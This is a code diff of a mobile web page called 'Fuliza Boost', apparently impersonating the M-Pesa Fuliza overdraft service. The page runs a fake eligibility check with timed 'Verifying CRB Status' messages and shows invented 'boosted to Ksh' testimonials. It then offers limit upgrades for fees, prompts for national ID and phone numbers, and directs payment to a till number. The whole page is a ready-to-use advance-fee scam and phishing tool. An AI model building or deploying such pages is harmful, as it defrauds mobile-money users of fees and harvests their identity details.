@@ -1,174 +1,284 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>FulizaBoost</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fuliza Boost</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: #f5f6f7;
+body{
+  margin:0;
+  font-family:sans-serif;
+  background:#f4f6f8;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
 }
 
-.container {
-  max-width: 400px;
-  margin: auto;
-  padding: 20px;
+.card{
+  width:92%;
+  max-width:380px;
+  background:#fff;
+  padding:25px;
+  border-radius:20px;
+  box-shadow:0 5px 25px rgba(0,0,0,0.1);
 }
 
-.title {
-  text-align: center;
-  font-size: 28px;
-  font-weight: bold;
+.hidden{display:none;}
+
+input{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:1px solid #ddd;
+  margin-top:15px;
 }
 
-.subtitle {
-  text-align: center;
-  color: gray;
-  margin-bottom: 15px;
+/* BUTTONS */
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:14px;
+  margin-top:15px;
+  font-weight:bold;
+  cursor:pointer;
 }
 
-.live {
-  background: #eef1f4;
-  padding: 10px;
-  border-radius: 10px;
-  font-size: 14px;
-  margin-bottom: 20px;
+.green{background:#16a34a;color:#fff;}
+.dark{background:#0f172a;color:#fff;}
+
+/* LIVE ACTIVITY */
+.activity{
+  margin-top:12px;
+  font-size:13px;
+  color:#444;
+  text-align:center;
+  background:#f9fafb;
+  padding:8px;
+  border-radius:10px;
 }
 
-.grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 12px;
+/* LOADER */
+.spinner{
+  width:60px;
+  height:60px;
+  border:6px solid #ddd;
+  border-top:6px solid #16a34a;
+  border-radius:50%;
+  margin:0 auto 20px;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{100%{transform:rotate(360deg);}}
+
+/* SUCCESS */
+.check-circle{
+  width:80px;
+  height:80px;
+  background:#16a34a;
+  color:#fff;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:40px;
+  margin:0 auto 15px;
 }
 
-.card {
-  background: #fff;
-  padding: 15px;
-  border-radius: 12px;
-  text-align: center;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-  cursor: pointer;
-  border: 2px solid transparent;
+/* LIMITS */
+.limits{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:12px;
+  margin-top:20px;
 }
 
-.card.active {
-  border: 2px solid green;
-  background: #eaffea;
+.box{
+  border:1px solid #eee;
+  border-radius:16px;
+  padding:15px;
+  text-align:center;
+  cursor:pointer;
 }
 
-.amount {
-  color: green;
-  font-weight: bold;
-  font-size: 18px;
+.box strong{
+  display:block;
+  color:#15803d;
+  font-size:18px;
 }
 
-.fee {
-  color: gray;
-  font-size: 13px;
+.box span{
+  font-size:13px;
+  color:#888;
 }
 
-.button {
-  margin-top: 20px;
-  width: 100%;
-  padding: 15px;
-  background: green;
-  color: white;
-  border: none;
-  border-radius: 12px;
-  font-size: 16px;
-  font-weight: bold;
-}
-
-.help {
-  text-align: center;
-  color: green;
-  margin-top: 10px;
-  font-size: 14px;
+.box.active{
+  border:2px solid #16a34a;
+  background:#ecfdf5;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<!-- STEP 1 -->
+<div class="card" id="step1">
+  <h2>Fuliza Plus+</h2>
+  <p style="text-align:center;">Verify your identity to unlock higher limits.</p>
 
-  <div class="title">FulizaBoost</div>
-  <div class="subtitle">Instant Limit Increase • Same Day Access</div>
+  <input id="phone" placeholder="Enter M-Pesa Number">
+  <button class="green" onclick="startProcess()">Check My Eligibility</button>
 
-  <div class="live" id="liveText">
-    Loading activity...
+  <div class="activity" id="liveActivity">
+    Brian O. boosted to Ksh 21,000
+  </div>
+</div>
+
+<!-- STEP 2 -->
+<div class="card hidden" id="step2">
+  <div class="spinner"></div>
+  <h3 id="loadingText">Connecting...</h3>
+  <p style="text-align:center;">Accessing secure databases...</p>
+</div>
+
+<!-- STEP 3 -->
+<div class="card hidden" id="step3">
+  <div class="check-circle">✓</div>
+  <h2 style="text-align:center;">Congratulations!</h2>
+  <p style="text-align:center;">
+    High Trust Score Detected.
+    <span id="userNumber" style="color:#16a34a;font-weight:bold;"></span>
+    is eligible for a boost.
+  </p>
+  <button class="dark" onclick="showLimits()">Proceed to Upgrade Limit</button>
+</div>
+
+<!-- LIMITS -->
+<div class="card hidden" id="limits">
+  <h3 style="text-align:center;">Select Your New Approved Limit</h3>
+
+  <div class="limits">
+    <div class="box" data-amount="3000"><strong>Ksh 3,000</strong><span>Fee: 250</span></div>
+    <div class="box" data-amount="5000"><strong>Ksh 5,000</strong><span>Fee: 293</span></div>
+    <div class="box" data-amount="7500"><strong>Ksh 7,500</strong><span>Fee: 350</span></div>
+    <div class="box" data-amount="10000"><strong>Ksh 10,000</strong><span>Fee: 500</span></div>
+    <div class="box" data-amount="12500"><strong>Ksh 12,500</strong><span>Fee: 747</span></div>
+    <div class="box" data-amount="16000"><strong>Ksh 16,000</strong><span>Fee: 898</span></div>
+    <div class="box" data-amount="21000"><strong>Ksh 21,000</strong><span>Fee: 1015</span></div>
+    <div class="box" data-amount="25500"><strong>Ksh 25,500</strong><span>Fee: 1220</span></div>
+    <div class="box" data-amount="30000"><strong>Ksh 30,000</strong><span>Fee: 1533</span></div>
+    <div class="box" data-amount="35000"><strong>Ksh 35,000</strong><span>Fee: 1730</span></div>
+    <div class="box" data-amount="45000"><strong>Ksh 45,000</strong><span>Fee: 2000</span></div>
+    <div class="box" data-amount="60000"><strong>Ksh 60,000</strong><span>Fee: 2250</span></div>
+    <div class="box" data-amount="70000"><strong>Ksh 70,000</strong><span>Fee: 2500</span></div>
   </div>
 
-  <h3>Select Your New Approved Limit</h3>
-
-  <div class="grid" id="grid"></div>
-
-  <button class="button" id="upgradeBtn">
-    ⚡ UPGRADE
-  </button>
-
-  <div class="help">Need help? Chat with Support</div>
-
+  <button id="upgradeBtn" class="green" onclick="upgrade()">⚡ UPGRADE</button>
 </div>
 
 <script>
-const limits = [
-  {amount:3000, fee:250},
-  {amount:5000, fee:293},
-  {amount:7500, fee:350},
-  {amount:10000, fee:500},
-  {amount:12500, fee:747},
-  {amount:16000, fee:898},
-  {amount:21000, fee:1015},
-  {amount:25500, fee:1220},
-  {amount:30000, fee:1533},
-  {amount:35000, fee:1730},
-  {amount:45000, fee:2000},
-  {amount:60000, fee:2250},
-  {amount:70000, fee:2500}
+
+// LIVE ACTIVITY ROTATION
+const activities = [
+  "Brian O. boosted to Ksh 21,000",
+  "Faith W. boosted to Ksh 45,000",
+  "Kevin M. boosted to Ksh 30,000",
+  "Diana K. boosted to Ksh 12,500",
+  "James T. boosted to Ksh 60,000",
+  "Mary N. boosted to Ksh 25,500"
 ];
 
-let selected = null;
-const grid = document.getElementById("grid");
+let index = 0;
 
-limits.forEach(item => {
-  const div = document.createElement("div");
-  div.className = "card";
-  div.innerHTML = `
-    <div class="amount">Ksh ${item.amount.toLocaleString()}</div>
-    <div class="fee">Fee: KSH ${item.fee}</div>
-  `;
-
-  div.onclick = () => {
-    document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
-    div.classList.add("active");
-    selected = item;
-
-    document.getElementById("upgradeBtn").innerText =
-      "⚡ UPGRADE TO KSH " + item.amount.toLocaleString();
-  };
-
-  grid.appendChild(div);
-});
-
-// LIVE ACTIVITY
-const names = ["Brian M.", "Kevin K.", "Jane N.", "Alex P.", "Faith W."];
-const phones = ["0712****111", "0704****709", "0798****555"];
-
-function updateLive() {
-  const name = names[Math.floor(Math.random() * names.length)];
-  const phone = phones[Math.floor(Math.random() * phones.length)];
-  const amount = limits[Math.floor(Math.random() * limits.length)].amount;
-
-  document.getElementById("liveText").innerText =
-    `${name} (${phone}) boosted to Ksh ${amount.toLocaleString()} just now`;
+function updateActivity(){
+  const el = document.getElementById("liveActivity");
+  if(el){
+    el.innerText = activities[index];
+    index = (index + 1) % activities.length;
+  }
 }
 
-setInterval(updateLive, 3000);
-updateLive();
+updateActivity();
+setInterval(updateActivity, 2500);
+
+// STEP FLOW (unchanged)
+function startProcess(){
+  let phone = document.getElementById("phone").value;
+
+  if(phone === ""){
+    alert("Enter phone number");
+    return;
+  }
+
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden");
+
+  let steps = [
+    "Connecting...",
+    "Checking Usage History...",
+    "Verifying CRB Status...",
+    "Finalizing Trust Score..."
+  ];
+
+  let i = 0;
+
+  let interval = setInterval(()=>{
+    document.getElementById("loadingText").innerText = steps[i];
+    i++;
+
+    if(i === steps.length){
+      clearInterval(interval);
+
+      setTimeout(()=>{
+        document.getElementById("step2").classList.add("hidden");
+        document.getElementById("step3").classList.remove("hidden");
+
+        document.getElementById("userNumber").innerText = phone;
+      },1000);
+    }
+  },2000);
+}
+
+function showLimits(){
+  document.getElementById("step3").classList.add("hidden");
+  document.getElementById("limits").classList.remove("hidden");
+}
+
+let selectedAmount = "";
+let boxes = document.querySelectorAll(".box");
+
+boxes.forEach(box=>{
+  box.addEventListener("click", ()=>{
+    boxes.forEach(b=>b.classList.remove("active"));
+    box.classList.add("active");
+
+    selectedAmount = box.getAttribute("data-amount");
+
+    document.getElementById("upgradeBtn").innerText =
+      "⚡ UPGRADE TO KSH " + Number(selectedAmount).toLocaleString();
+  });
+});
+
+function upgrade(){
+  if(!selectedAmount){
+    alert("Please select a limit");
+    return;
+  }
+
+  let id = prompt("Enter ID Number:");
+  if(!id) return;
+
+  let phone = prompt("Enter Phone Number:");
+  if(!phone) return;
+
+  alert(
+    "Upgrade to KSH " + Number(selectedAmount).toLocaleString() + " approved!\n\n" +
+    "Pay to Till Number: 6363781\n" +
+    "Use your number: " + phone
+  );
+}
+
 </script>
 
 </body>
